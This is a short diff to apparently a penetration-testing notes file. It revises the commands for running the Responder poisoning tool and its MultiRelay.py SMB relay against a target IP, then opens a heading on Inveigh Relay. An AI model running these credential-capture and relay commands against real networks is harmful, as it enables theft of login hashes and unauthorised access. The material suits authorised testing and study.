@@ -11,13 +11,13 @@ Set responder.conf to:
 Then run responder:
 
 ```
-Responder -i xxx.xxx.xxx.xxx -I eth0 -f -b -w
+sudo python3.9 /usr/share/responder/Responder.py -I eth0 -w -f -v
 ```
 
 Then run the following in another terminal session
 
 ```
-/usr/share/responder/tools/MultiRelay.py -t <target_IP> -u ALL
+sudo python3.9 /usr/share/responder/tools/MultiRelay.py -t <target_IP> -u ALL
 ```
 
 ### Inveigh Relay
